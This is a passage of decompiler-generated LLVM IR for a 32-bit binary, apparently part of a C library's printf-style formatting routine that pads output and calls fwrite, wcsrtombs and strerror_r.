  store i32 %v1_804eb4b, i32* @edi, align 4
  %v1_804eb52 = add i32 %v0_804e884.lcssa, 205
  %v2_804eb52 = inttoptr i32 %v1_804eb52 to i8*
  store i8 0, i8* %v2_804eb52, align 1
  %v0_804eb5a = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb5a = trunc i32 %v0_804eb5a to i8
  %v2_804eb5a = load i32, i32* @esp, align 4
  %v3_804eb5a = add i32 %v2_804eb5a, 204
  %v4_804eb5a = inttoptr i32 %v3_804eb5a to i8*
  store i8 %v1_804eb5a, i8* %v4_804eb5a, align 1
  br label %dec_label_pc_804eba2

dec_label_pc_804eb63:                             ; preds = %dec_label_pc_804eb06
  %v1_804eb63 = add i32 %v3_804e884, -20
  %v9_804eb63 = icmp eq i32 %v1_804eb63, 0
  %v10_804eb63 = icmp slt i32 %v1_804eb63, 0
  store i1 %v10_804eb63, i1* %sf.global-to-local, align 1
  %v1_804eb66 = icmp eq i1 %v9_804eb63, false
  br i1 %v1_804eb66, label %dec_label_pc_804ed07, label %dec_label_pc_804eb6c

dec_label_pc_804eb6c:                             ; preds = %dec_label_pc_804eb63
  %v0_804eb6c = load i32, i32* %stack_var_-364, align 4
  %v1_804eb6c = call i32 @__errno_location(i32 %v0_804eb6c)
  store i32 %v1_804eb6c, i32* %eax.global-to-local, align 4
  %v0_804eb71 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eb71 = load i32, i32* @esp, align 4
  %v2_804eb71 = add i32 %v1_804eb71, -4
  %v3_804eb71 = inttoptr i32 %v2_804eb71 to i32*
  store i32 %v0_804eb71, i32* %v3_804eb71, align 4
  %v1_804eb72 = add i32 %v1_804eb71, -8
  %v2_804eb72 = inttoptr i32 %v1_804eb72 to i32*
  store i32 128, i32* %v2_804eb72, align 4
  %v1_804eb77 = add i32 %v1_804eb71, 204
  store i32 %v1_804eb77, i32* %edx.global-to-local, align 4
  %v2_804eb7e = add i32 %v1_804eb71, -12
  %v3_804eb7e = inttoptr i32 %v2_804eb7e to i32*
  store i32 %v1_804eb77, i32* %v3_804eb7e, align 4
  %v1_804eb7f = inttoptr i32 %v1_804eb6c to i32*
  %v2_804eb7f = load i32, i32* %v1_804eb7f, align 4
  %v4_804eb7f = add i32 %v1_804eb71, -16
  %v5_804eb7f = inttoptr i32 %v4_804eb7f to i32*
  store i32 %v2_804eb7f, i32* %v5_804eb7f, align 4
  %v0_804eb81 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804eb81, i32* %eax.global-to-local, align 4
  %v0_804eb86 = load i32, i32* @esp, align 4
  %v1_804eb86 = add i32 %v0_804eb86, 16
  %v7_804eb86 = icmp slt i32 %v1_804eb86, 0
  store i1 %v7_804eb86, i1* %sf.global-to-local, align 1
  store i32 %v0_804eb81, i32* @edi, align 4
  br label %dec_label_pc_804eb1a

dec_label_pc_804eb8d:                             ; preds = %dec_label_pc_804ea0e, %dec_label_pc_804ea07, %dec_label_pc_804e9f4
  %v0_804ebaa35 = phi i32 [ %v1_804e99d, %dec_label_pc_804ea0e ], [ 0, %dec_label_pc_804ea07 ], [ 5, %dec_label_pc_804e9f4 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804eba7

dec_label_pc_804eb91:                             ; preds = %dec_label_pc_804eb14, %dec_label_pc_804ea86
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805737e.166 to i32), i32* @edi, align 4
  br label %dec_label_pc_804eba2

dec_label_pc_804eba2:                             ; preds = %dec_label_pc_804eb3d, %dec_label_pc_804eb34, %dec_label_pc_804eac8, %dec_label_pc_804eb91
  %v0_804eba2 = load i32, i32* @esp, align 4
  %v1_804eba2 = add i32 %v0_804eba2, 7
  %v2_804eba2 = inttoptr i32 %v1_804eba2 to i8*
  store i8 32, i8* %v2_804eba2, align 1
  %v0_804ebaa.pre = load i32, i32* @esi, align 4
  %v1_804ebaa.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eba7

dec_label_pc_804eba7:                             ; preds = %dec_label_pc_804eb8d, %dec_label_pc_804ea16, %dec_label_pc_804eba2
  %v1_804ebaa = phi i32 [ 0, %dec_label_pc_804eb8d ], [ %v2_804ea0e, %dec_label_pc_804ea16 ], [ %v1_804ebaa.pre, %dec_label_pc_804eba2 ]
  %v0_804ebaa = phi i32 [ %v0_804ebaa35, %dec_label_pc_804eb8d ], [ %v1_804e99d, %dec_label_pc_804ea16 ], [ %v0_804ebaa.pre, %dec_label_pc_804eba2 ]
  %v0_804eba7 = load i32, i32* @ebp, align 4
  %v1_804eba7 = add i32 %v0_804eba7, -11
  %v9_804eba7 = icmp eq i32 %v1_804eba7, 0
  %v10_804eba7 = icmp slt i32 %v1_804eba7, 0
  store i1 %v10_804eba7, i1* %sf.global-to-local, align 1
  %v2_804ebaa = add i32 %v0_804ebaa, %v1_804ebaa
  store i32 %v2_804ebaa, i32* @edx, align 4
  br i1 %v9_804eba7, label %dec_label_pc_804ebbb, label %dec_label_pc_804ebaf

dec_label_pc_804ebaf:                             ; preds = %dec_label_pc_804eba7
  %v1_804ebb1 = add i32 %v0_804eba7, -5
  %v6_804ebb1 = sub i32 4, %v0_804eba7
  %v7_804ebb1 = and i32 %v6_804ebb1, %v0_804eba7
  %v8_804ebb1 = icmp slt i32 %v7_804ebb1, 0
  %v9_804ebb1 = icmp eq i32 %v1_804ebb1, 0
  %v10_804ebb1 = icmp slt i32 %v1_804ebb1, 0
  store i1 %v10_804ebb1, i1* %sf.global-to-local, align 1
  %v3_804ebb4 = icmp eq i1 %v10_804ebb1, %v8_804ebb1
  %v4_804ebb4 = icmp eq i1 %v9_804ebb1, false
  %v5_804ebb4 = and i1 %v4_804ebb4, %v3_804ebb4
  %v6_804ebb4 = zext i1 %v5_804ebb4 to i32
  store i32 %v6_804ebb4, i32* %eax.global-to-local, align 4
  %v2_804ebb7 = add i32 %v2_804ebaa, 1
  %v3_804ebb7 = add i32 %v2_804ebb7, %v6_804ebb4
  store i32 %v3_804ebb7, i32* @edx, align 4
  br label %dec_label_pc_804ebbb

dec_label_pc_804ebbb:                             ; preds = %dec_label_pc_804eba7, %dec_label_pc_804ebaf
  %v0_804ebbb = load i32, i32* @esp, align 4
  %v1_804ebbb = add i32 %v0_804ebbb, 24
  %v2_804ebbb = inttoptr i32 %v1_804ebbb to i32*
  %v3_804ebbb = load i32, i32* %v2_804ebbb, align 4
  store i32 %v3_804ebbb, i32* %eax.global-to-local, align 4
  %v1_804ebbf = add i32 %v0_804ebbb, 8
  %v2_804ebbf = inttoptr i32 %v1_804ebbf to i32*
  store i32 0, i32* %v2_804ebbf, align 4
  %v0_804ebc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ebc7 = load i32, i32* @edx, align 4
  %v2_804ebc7 = sub i32 %v0_804ebc7, %v1_804ebc7
  %v7_804ebc7 = icmp ult i32 %v0_804ebc7, %v1_804ebc7
  %v12_804ebc7 = icmp eq i32 %v2_804ebc7, 0
  %v13_804ebc7 = icmp slt i32 %v2_804ebc7, 0
  store i1 %v13_804ebc7, i1* %sf.global-to-local, align 1
  %v2_804ebc9 = or i1 %v7_804ebc7, %v12_804ebc7
  br i1 %v2_804ebc9, label %dec_label_pc_804ebd1, label %dec_label_pc_804ebcb

dec_label_pc_804ebcb:                             ; preds = %dec_label_pc_804ebbb
  store i1 %v13_804ebc7, i1* %sf.global-to-local, align 1
  store i32 %v2_804ebc7, i32* %eax.global-to-local, align 4
  %v1_804ebcd = load i32, i32* @esp, align 4
  %v2_804ebcd = add i32 %v1_804ebcd, 8
  %v3_804ebcd = inttoptr i32 %v2_804ebcd to i32*
  store i32 %v2_804ebc7, i32* %v3_804ebcd, align 4
  %v0_804ebd5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ebd1

dec_label_pc_804ebd1:                             ; preds = %dec_label_pc_804ebbb, %dec_label_pc_804ebcb
  %v0_804ebd5 = phi i32 [ %v1_804ebc7, %dec_label_pc_804ebbb ], [ %v0_804ebd5.pre, %dec_label_pc_804ebcb ]
  %v0_804ebd1 = load i32, i32* @esp, align 4
  %v1_804ebd1 = add i32 %v0_804ebd1, 8
  %v2_804ebd1 = inttoptr i32 %v1_804ebd1 to i32*
  %v3_804ebd1 = load i32, i32* %v2_804ebd1, align 4
  store i32 %v3_804ebd1, i32* @ecx, align 4
  %v2_804ebd5 = add i32 %v3_804ebd1, %v0_804ebd5
  store i32 %v2_804ebd5, i32* %eax.global-to-local, align 4
  %v1_804ebd8 = inttoptr i32 %v0_804ebd1 to i32*
  %v2_804ebd8 = load i32, i32* %v1_804ebd8, align 4
  %v4_804ebd8 = add i32 %v2_804ebd8, %v2_804ebd5
  %v15_804ebd8 = icmp slt i32 %v4_804ebd8, 0
  store i1 %v15_804ebd8, i1* %sf.global-to-local, align 1
  store i32 %v4_804ebd8, i32* %v1_804ebd8, align 4
  %v0_804ebdb = load i32, i32* @esp, align 4
  %v1_804ebdb = add i32 %v0_804ebdb, 7
  %v2_804ebdb = inttoptr i32 %v1_804ebdb to i8*
  %v3_804ebdb = load i8, i8* %v2_804ebdb, align 1
  %v4_804ebdb = add i8 %v3_804ebdb, -48
  %v9_804ebdb = icmp eq i8 %v4_804ebdb, 0
  %v10_804ebdb = icmp slt i8 %v4_804ebdb, 0
  store i1 %v10_804ebdb, i1* %sf.global-to-local, align 1
  %v1_804ebe0 = icmp eq i1 %v9_804ebdb, false
  br i1 %v1_804ebe0, label %dec_label_pc_804ebec, label %dec_label_pc_804ebe2

dec_label_pc_804ebe2:                             ; preds = %dec_label_pc_804ebd1
  %v0_804ebe2 = load i32, i32* @ebx, align 4
  %v1_804ebe2 = load i32, i32* @ecx, align 4
  %v2_804ebe2 = add i32 %v1_804ebe2, %v0_804ebe2
  %v13_804ebe2 = icmp slt i32 %v2_804ebe2, 0
  store i1 %v13_804ebe2, i1* %sf.global-to-local, align 1
  store i32 %v2_804ebe2, i32* @ebx, align 4
  %v1_804ebe4 = add i32 %v0_804ebdb, 8
  %v2_804ebe4 = inttoptr i32 %v1_804ebe4 to i32*
  store i32 0, i32* %v2_804ebe4, align 4
  %v0_804ebec.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebec

dec_label_pc_804ebec:                             ; preds = %dec_label_pc_804ebd1, %dec_label_pc_804ebe2
  %v0_804ebf3 = phi i32 [ %v0_804ebdb, %dec_label_pc_804ebd1 ], [ %v0_804ebec.pre, %dec_label_pc_804ebe2 ]
  %v1_804ebec = add i32 %v0_804ebf3, 32
  %v2_804ebec = inttoptr i32 %v1_804ebec to i8*
  %v3_804ebec = load i8, i8* %v2_804ebec, align 1
  %v4_804ebec = and i8 %v3_804ebec, 8
  %v5_804ebec = icmp eq i8 %v4_804ebec, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804ebf1 = icmp eq i1 %v5_804ebec, false
  br i1 %v1_804ebf1, label %dec_label_pc_804ec1a, label %dec_label_pc_804ebf3

dec_label_pc_804ebf3:                             ; preds = %dec_label_pc_804ebec
  %v1_804ebf3 = add i32 %v0_804ebf3, 8
  %v2_804ebf3 = inttoptr i32 %v1_804ebf3 to i32*
  %v3_804ebf3 = load i32, i32* %v2_804ebf3, align 4
  store i32 %v3_804ebf3, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ebfc = add i32 %v0_804ebf3, 368
  %v2_804ebfc = inttoptr i32 %v1_804ebfc to i32*
  %v3_804ebfc = load i32, i32* %v2_804ebfc, align 4
  store i32 %v3_804ebfc, i32* @eax, align 4
  %v0_804ec03 = call i32 @_charpad()
  store i32 %v0_804ec03, i32* %eax.global-to-local, align 4
  %v1_804ec08 = load i32, i32* @esp, align 4
  %v2_804ec08 = add i32 %v1_804ec08, 8
  %v3_804ec08 = inttoptr i32 %v2_804ec08 to i32*
  %v4_804ec08 = load i32, i32* %v3_804ec08, align 4
  %v5_804ec08 = sub i32 %v0_804ec03, %v4_804ec08
  %v15_804ec08 = icmp eq i32 %v5_804ec08, 0
  %v16_804ec08 = icmp slt i32 %v5_804ec08, 0
  store i1 %v16_804ec08, i1* %sf.global-to-local, align 1
  %v1_804ec0c = icmp eq i1 %v15_804ec08, false
  br i1 %v1_804ec0c, label %dec_label_pc_804ed07, label %dec_label_pc_804ec12

dec_label_pc_804ec12:                             ; preds = %dec_label_pc_804ebf3
  store i32 0, i32* %v3_804ec08, align 4
  %v1_804ec1a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ec1a

dec_label_pc_804ec1a:                             ; preds = %dec_label_pc_804ebec, %dec_label_pc_804ec12
  %v1_804ec1a = phi i32 [ %v0_804ebf3, %dec_label_pc_804ebec ], [ %v1_804ec1a.pre, %dec_label_pc_804ec12 ]
  %v0_804ec1a = load i32, i32* %eax.global-to-local, align 4
  %v2_804ec1a = add i32 %v1_804ec1a, -4
  %v3_804ec1a = inttoptr i32 %v2_804ec1a to i32*
  store i32 %v0_804ec1a, i32* %v3_804ec1a, align 4
  %v0_804ec1b = load i32, i32* %eax.global-to-local, align 4
  %v2_804ec1b = add i32 %v1_804ec1a, -8
  %v3_804ec1b = inttoptr i32 %v2_804ec1b to i32*
  store i32 %v0_804ec1b, i32* %v3_804ec1b, align 4
  %v1_804ec1c = add i32 %v1_804ec1a, 368
  %v2_804ec1c = inttoptr i32 %v1_804ec1c to i32*
  %v3_804ec1c = load i32, i32* %v2_804ec1c, align 4
  %v5_804ec1c = add i32 %v1_804ec1a, -12
  %v6_804ec1c = inttoptr i32 %v5_804ec1c to i32*
  store i32 %v3_804ec1c, i32* %v6_804ec1c, align 4
  %v0_804ec23 = load i32, i32* @ebp, align 4
  %v1_804ec23 = add i32 %v0_804ec23, ptrtoint (i32* @global_var_8057385.167 to i32)
  store i32 %v1_804ec23, i32* %eax.global-to-local, align 4
  %v2_804ec29 = add i32 %v1_804ec1a, -16
  %v3_804ec29 = inttoptr i32 %v2_804ec29 to i32*
  store i32 %v1_804ec23, i32* %v3_804ec29, align 4
  %v0_804ec2a = load i32, i32* %stack_var_-364, align 4
  %v4_804ec2a = inttoptr i32 %v0_804ec2a to i8*
  %v5_804ec2a = call i32 @__GI_fputs_unlocked(i8* %v4_804ec2a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ec2a, i32* %eax.global-to-local, align 4
  %v0_804ec2f = load i32, i32* @esp, align 4
  %v1_804ec2f = add i32 %v0_804ec2f, 384
  %v2_804ec2f = inttoptr i32 %v1_804ec2f to i32*
  %v3_804ec2f = load i32, i32* %v2_804ec2f, align 4
  store i32 %v3_804ec2f, i32* @eax, align 4
  %v0_804ec36 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec36, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804ec3d = call i32 @_charpad()
  store i32 %v0_804ec3d, i32* %eax.global-to-local, align 4
  %v0_804ec42 = load i32, i32* @esp, align 4
  %v1_804ec42 = add i32 %v0_804ec42, 16
  %v1_804ec45 = load i32, i32* @ebx, align 4
  %v2_804ec45 = sub i32 %v0_804ec3d, %v1_804ec45
  %v12_804ec45 = icmp eq i32 %v2_804ec45, 0
  %v13_804ec45 = icmp slt i32 %v2_804ec45, 0
  store i1 %v13_804ec45, i1* %sf.global-to-local, align 1
  %v1_804ec47 = icmp eq i1 %v12_804ec45, false
  br i1 %v1_804ec47, label %dec_label_pc_804ed07, label %dec_label_pc_804ec4d

dec_label_pc_804ec4d:                             ; preds = %dec_label_pc_804ec1a
  %v1_804ec4d = add i32 %v0_804ec42, 356
  %v2_804ec4d = inttoptr i32 %v1_804ec4d to i32*
  %v3_804ec4d = load i32, i32* %v2_804ec4d, align 4
  %v4_804ec4d = icmp eq i32 %v3_804ec4d, 0
  %v5_804ec4d = icmp slt i32 %v3_804ec4d, 0
  store i1 %v5_804ec4d, i1* %sf.global-to-local, align 1
  %v1_804ec55 = icmp eq i1 %v4_804ec4d, false
  br i1 %v1_804ec55, label %dec_label_pc_804ec79, label %dec_label_pc_804ec57

dec_label_pc_804ec57:                             ; preds = %dec_label_pc_804ec4d
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804ec59 = load i32, i32* @esi, align 4
  %v1_804ec59 = icmp eq i32 %v0_804ec59, 0
  %v2_804ec59 = icmp slt i32 %v0_804ec59, 0
  store i1 %v2_804ec59, i1* %sf.global-to-local, align 1
  br i1 %v1_804ec59, label %dec_label_pc_804ec6f, label %dec_label_pc_804ec5d

dec_label_pc_804ec5d:                             ; preds = %dec_label_pc_804ec57
  %v2_804ec5d = add i32 %v0_804ec42, 12
  %v3_804ec5d = inttoptr i32 %v2_804ec5d to i32*
  store i32 0, i32* %v3_804ec5d, align 4
  %v1_804ec5e = add i32 %v0_804ec42, 384
  %v2_804ec5e = inttoptr i32 %v1_804ec5e to i32*
  %v3_804ec5e = load i32, i32* %v2_804ec5e, align 4
  %v5_804ec5e = add i32 %v0_804ec42, 8
  %v6_804ec5e = inttoptr i32 %v5_804ec5e to i32*
  store i32 %v3_804ec5e, i32* %v6_804ec5e, align 4
  %v0_804ec65 = load i32, i32* @esi, align 4
  %v2_804ec65 = add i32 %v0_804ec42, 4
  %v3_804ec65 = inttoptr i32 %v2_804ec65 to i32*
  store i32 %v0_804ec65, i32* %v3_804ec65, align 4
  %v0_804ec66 = load i32, i32* @edi, align 4
  %v3_804ec66 = inttoptr i32 %v0_804ec42 to i32*
  store i32 %v0_804ec66, i32* %v3_804ec66, align 4
  %v0_804ec67 = load i32, i32* %stack_var_-364, align 4
  %v4_804ec67 = call i32 @__stdio_fwrite(i32 %v0_804ec67, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ec67, i32* %eax.global-to-local, align 4
  %v0_804ec6c = load i32, i32* @esp, align 4
  %v1_804ec6c = add i32 %v0_804ec6c, 16
  %v7_804ec6c = icmp slt i32 %v1_804ec6c, 0
  store i1 %v7_804ec6c, i1* %sf.global-to-local, align 1
  %v1_804ec6f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ec6f

dec_label_pc_804ec6f:                             ; preds = %dec_label_pc_804ec57, %dec_label_pc_804ec5d
  %v0_804ecd947 = phi i32 [ %v1_804ec42, %dec_label_pc_804ec57 ], [ %v1_804ec6c, %dec_label_pc_804ec5d ]
  %v1_804ec6f = phi i32 [ 0, %dec_label_pc_804ec57 ], [ %v1_804ec6f.pre, %dec_label_pc_804ec5d ]
  %v0_804ec6f = phi i32 [ 0, %dec_label_pc_804ec57 ], [ %v4_804ec67, %dec_label_pc_804ec5d ]
  %v2_804ec6f = sub i32 %v0_804ec6f, %v1_804ec6f
  %v12_804ec6f = icmp eq i32 %v2_804ec6f, 0
  %v13_804ec6f = icmp slt i32 %v2_804ec6f, 0
  store i1 %v13_804ec6f, i1* %sf.global-to-local, align 1
  %v1_804ec71 = icmp eq i1 %v12_804ec6f, false
  br i1 %v1_804ec71, label %dec_label_pc_804ed07, label %dec_label_pc_804ecd9

dec_label_pc_804ec79:                             ; preds = %dec_label_pc_804ec4d
  %v1_804ec79 = add i32 %v0_804ec42, 348
  %v2_804ec79 = inttoptr i32 %v1_804ec79 to i32*
  store i32 0, i32* %v2_804ec79, align 4
  %v0_804ecd59 = load i32, i32* @esi, align 4
  %v1_804ecd510 = icmp eq i32 %v0_804ecd59, 0
  %v2_804ecd511 = icmp slt i32 %v0_804ecd59, 0
  store i1 %v2_804ecd511, i1* %sf.global-to-local, align 1
  %v1_804ecd717 = icmp eq i1 %v1_804ecd510, false
  %v0_804ec86.pre = load i32, i32* @esp, align 4
  br i1 %v1_804ecd717, label %dec_label_pc_804ec86, label %dec_label_pc_804ecd9

dec_label_pc_804ec86:                             ; preds = %dec_label_pc_804ec79, %dec_label_pc_804ecd3
  %v0_804ec8d = phi i32 [ %v2_804ecd3, %dec_label_pc_804ecd3 ], [ %v0_804ecd59, %dec_label_pc_804ec79 ]
  %v1_804ec98 = phi i32 [ %v0_804ec8642, %dec_label_pc_804ecd3 ], [ %v0_804ec86.pre, %dec_label_pc_804ec79 ]
  %v1_804ec86 = add i32 %v1_804ec98, 332
  store i32 %v1_804ec86, i32* %edx.global-to-local, align 4
  %v1_804ec8d = add i32 %v0_804ec8d, -128
  %v2_804ec8d = icmp ult i32 %v0_804ec8d, 128
  %v6_804ec8d = icmp eq i32 %v1_804ec8d, 0
  %v7_804ec8d = icmp slt i32 %v1_804ec8d, 0
  store i1 %v7_804ec8d, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804ec98 = add i32 %v1_804ec98, -4
  %v3_804ec98 = inttoptr i32 %v2_804ec98 to i32*
  store i32 %v1_804ec86, i32* %v3_804ec98, align 4
  %v2_804ec99 = or i1 %v2_804ec8d, %v6_804ec8d
  %v3_804ec99 = load i32, i32* %eax.global-to-local, align 4
  %v4_804ec99 = load i32, i32* @esi, align 4
  %v5_804ec99 = select i1 %v2_804ec99, i32 %v4_804ec99, i32 %v3_804ec99
  %v2_804ec9c = add i32 %v1_804ec98, -8
  %v3_804ec9c = inttoptr i32 %v2_804ec9c to i32*
  store i32 %v5_804ec99, i32* %v3_804ec9c, align 4
  %v1_804ec9d = add i32 %v1_804ec98, 340
  store i32 %v1_804ec9d, i32* %eax.global-to-local, align 4
  %v2_804eca4 = add i32 %v1_804ec98, -12
  %v3_804eca4 = inttoptr i32 %v2_804eca4 to i32*
  store i32 %v1_804ec9d, i32* %v3_804eca4, align 4
  %v1_804eca5 = add i32 %v1_804ec98, 204
  store i32 %v1_804eca5, i32* @edi, align 4
  %v2_804ecac = add i32 %v1_804ec98, -16
  %v3_804ecac = inttoptr i32 %v2_804ecac to i32*
  store i32 %v1_804eca5, i32* %v3_804ecac, align 4
  %v0_804ecad = call i32 @__GI_wcsrtombs()
  %v0_804ecb2 = load i32, i32* @esp, align 4
  %v1_804ecb2 = add i32 %v0_804ecb2, 16
  store i32 %v0_804ecad, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ecb9 = icmp eq i32 %v0_804ecad, 0
  %v2_804ecb9 = icmp slt i32 %v0_804ecad, 0
  store i1 %v2_804ecb9, i1* %sf.global-to-local, align 1
  br i1 %v1_804ecb9, label %dec_label_pc_804eccf, label %dec_label_pc_804ecbd

dec_label_pc_804ecbd:                             ; preds = %dec_label_pc_804ec86
  %v0_804ecbd = load i32, i32* @ebp, align 4
  %v2_804ecbd = add i32 %v0_804ecb2, 12
  %v3_804ecbd = inttoptr i32 %v2_804ecbd to i32*
  store i32 %v0_804ecbd, i32* %v3_804ecbd, align 4
  %v1_804ecbe = add i32 %v0_804ecb2, 384
  %v2_804ecbe = inttoptr i32 %v1_804ecbe to i32*
  %v3_804ecbe = load i32, i32* %v2_804ecbe, align 4
  %v5_804ecbe = add i32 %v0_804ecb2, 8
  %v6_804ecbe = inttoptr i32 %v5_804ecbe to i32*
  store i32 %v3_804ecbe, i32* %v6_804ecbe, align 4
  %v2_804ecc5 = add i32 %v0_804ecb2, 4
  %v3_804ecc5 = inttoptr i32 %v2_804ecc5 to i32*
  store i32 %v0_804ecad, i32* %v3_804ecc5, align 4
  %v0_804ecc6 = load i32, i32* @edi, align 4
  %v3_804ecc6 = inttoptr i32 %v0_804ecb2 to i32*
  store i32 %v0_804ecc6, i32* %v3_804ecc6, align 4
  %v0_804ecc7 = load i32, i32* %stack_var_-364, align 4
  %v4_804ecc7 = call i32 @__stdio_fwrite(i32 %v0_804ecc7, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ecc7, i32* %eax.global-to-local, align 4
  %v0_804eccc = load i32, i32* @esp, align 4
  %v1_804eccc = add i32 %v0_804eccc, 16
  %v7_804eccc = icmp slt i32 %v1_804eccc, 0
  store i1 %v7_804eccc, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804eccf

dec_label_pc_804eccf:                             ; preds = %dec_label_pc_804ec86, %dec_label_pc_804ecbd
  %v1_804ecd3 = phi i32 [ 0, %dec_label_pc_804ec86 ], [ %v4_804ecc7, %dec_label_pc_804ecbd ]
  %v0_804ec8642 = phi i32 [ %v1_804ecb2, %dec_label_pc_804ec86 ], [ %v1_804eccc, %dec_label_pc_804ecbd ]
  %v2_804eccf = sub i32 %v1_804ecd3, %v0_804ecad
  %v12_804eccf = icmp eq i32 %v2_804eccf, 0
  %v13_804eccf = icmp slt i32 %v2_804eccf, 0
  store i1 %v13_804eccf, i1* %sf.global-to-local, align 1
  %v1_804ecd1 = icmp eq i1 %v12_804eccf, false
  br i1 %v1_804ecd1, label %dec_label_pc_804ed07, label %dec_label_pc_804ecd3

dec_label_pc_804ecd3:                             ; preds = %dec_label_pc_804eccf
  %v0_804ecd3 = load i32, i32* @esi, align 4
  %v2_804ecd3 = sub i32 %v0_804ecd3, %v1_804ecd3
  %v12_804ecd3 = icmp eq i32 %v2_804ecd3, 0
  %v13_804ecd3 = icmp slt i32 %v2_804ecd3, 0
  store i32 %v2_804ecd3, i32* @esi, align 4
  store i1 %v13_804ecd3, i1* %sf.global-to-local, align 1
  %v1_804ecd7 = icmp eq i1 %v12_804ecd3, false
  br i1 %v1_804ecd7, label %dec_label_pc_804ec86, label %dec_label_pc_804ecd9

dec_label_pc_804ecd9:                             ; preds = %dec_label_pc_804ecd3, %dec_label_pc_804ec79, %dec_label_pc_804ec6f
  %v0_804ecd9 = phi i32 [ %v0_804ecd947, %dec_label_pc_804ec6f ], [ %v0_804ec86.pre, %dec_label_pc_804ec79 ], [ %v0_804ec8642, %dec_label_pc_804ecd3 ]
  %v1_804ecd9 = add i32 %v0_804ecd9, 8
  %v2_804ecd9 = inttoptr i32 %v1_804ecd9 to i32*
  %v3_804ecd9 = load i32, i32* %v2_804ecd9, align 4
  store i32 %v3_804ecd9, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ece2 = add i32 %v0_804ecd9, 368
  %v2_804ece2 = inttoptr i32 %v1_804ece2 to i32*
  %v3_804ece2 = load i32, i32* %v2_804ece2, align 4
  store i32 %v3_804ece2, i32* @eax, align 4
  %v0_804ece9 = call i32 @_charpad()
  store i32 %v0_804ece9, i32* %eax.global-to-local, align 4
  %v1_804ecee = load i32, i32* @esp, align 4
  %v2_804ecee = add i32 %v1_804ecee, 8
  %v3_804ecee = inttoptr i32 %v2_804ecee to i32*
  %v4_804ecee = load i32, i32* %v3_804ecee, align 4
  %v5_804ecee = sub i32 %v0_804ece9, %v4_804ecee
  %v15_804ecee = icmp eq i32 %v5_804ecee, 0
  %v16_804ecee = icmp slt i32 %v5_804ecee, 0
  store i1 %v16_804ecee, i1* %sf.global-to-local, align 1
  %v1_804ecf2 = icmp eq i1 %v15_804ecee, false
  br i1 %v1_804ecf2, label %dec_label_pc_804ed07, label %dec_label_pc_804ecf4

dec_label_pc_804ecf4:                             ; preds = %dec_label_pc_804ecd9, %dec_label_pc_804ea61, %dec_label_pc_804e88c
  %v0_804ecf4 = phi i32 [ %v1_804ecee, %dec_label_pc_804ecd9 ], [ %v0_804ecf4.pre, %dec_label_pc_804ea61 ], [ %v1_804e8aa, %dec_label_pc_804e88c ]
  %v1_804ecf4 = add i32 %v0_804ecf4, 16
  %v2_804ecf4 = inttoptr i32 %v1_804ecf4 to i32*
  %v3_804ecf4 = load i32, i32* %v2_804ecf4, align 4
  store i32 %v3_804ecf4, i32* @ebx, align 4
  store i32 %v3_804ecf4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e7e4.backedge

dec_label_pc_804ecff:                             ; preds = %dec_label_pc_804e822
  %v1_804ecff = add i32 %v0_804ecff, 2
  %v10_804ecff = icmp slt i32 %v1_804ecff, 0
  store i1 %v10_804ecff, i1* %sf.global-to-local, align 1
  store i32 %v1_804ecff, i32* @ebx, align 4
  br label %dec_label_pc_804e7e4.backedge

dec_label_pc_804ed07:                             ; preds = %dec_label_pc_804e80e, %dec_label_pc_804ecd9, %dec_label_pc_804ec6f, %dec_label_pc_804ec1a, %dec_label_pc_804ebf3, %dec_label_pc_804eb63, %dec_label_pc_804ead6, %dec_label_pc_804ea97, %dec_label_pc_804ea38, %dec_label_pc_804eccf
  %v0_804ed07 = phi i32 [ %v0_804ec8642, %dec_label_pc_804eccf ], [ %v0_804ed07.pre.pre, %dec_label_pc_804e80e ], [ %v1_804ecee, %dec_label_pc_804ecd9 ], [ %v0_804ecd947, %dec_label_pc_804ec6f ], [ %v1_804ec42, %dec_label_pc_804ec1a ], [ %v1_804ec08, %dec_label_pc_804ebf3 ], [ %v0_804e884.lcssa, %dec_label_pc_804eb63 ], [ %v1_804eaee, %dec_label_pc_804ead6 ], [ %v1_804eaba, %dec_label_pc_804ea97 ], [ %v1_804ea56, %dec_label_pc_804ea38 ]
  %v1_804ed07 = inttoptr i32 %v0_804ed07 to i32*
  store i32 -1, i32* %v1_804ed07, align 4
  br label %dec_label_pc_804ed0e

dec_label_pc_804ed0e:                             ; preds = %dec_label_pc_804e819, %dec_label_pc_804e787, %dec_label_pc_804e7a6, %dec_label_pc_804ed07
  %v0_804ed0e = load i32, i32* @esp, align 4
  %v1_804ed0e = inttoptr i32 %v0_804ed0e to i32*
  %v2_804ed0e = load i32, i32* %v1_804ed0e, align 4
  store i32 %v2_804ed0e, i32* %eax.global-to-local, align 4
  %v1_804ed11 = add i32 %v0_804ed0e, 348
